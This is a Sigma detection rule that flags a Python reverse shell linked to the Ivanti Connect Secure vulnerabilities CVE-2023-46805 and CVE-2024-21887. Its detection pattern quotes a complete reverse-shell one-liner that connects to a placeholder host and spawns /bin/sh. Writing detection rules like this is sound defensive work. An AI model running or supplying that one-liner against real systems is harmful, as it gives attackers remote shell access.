title: Detection of Python Reverse Shell (CVE-2023-46805) and (CVE-2024-21887)
id: 2190672e-ce36-4d8a-8d7e-063284bb415d
description: Detects the execution of a Python reverse shell related to the IVanti Connect Secure zero-day vulnerability
references:
    - https://blog.cloudflare.com/how-cloudflares-ai-waf-proactively-detected-ivanti-connect-secure-critical-zero-day-vulnerability
author: douglasrose75
date: 2024/03/09
tags:
    - attack.execution
    - attack.t1059
    - cve.2023.46805
    - cve.2024.21887
    - detection.emerging_threats
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine:
            - '*;python -c*'
            - '*import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"CONNECTBACKIP\",CONNECTBACKPORT));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())*'
condition: selection
falsepositives:
    - Legitimate use of Python for network communication and subprocess execution
level: high
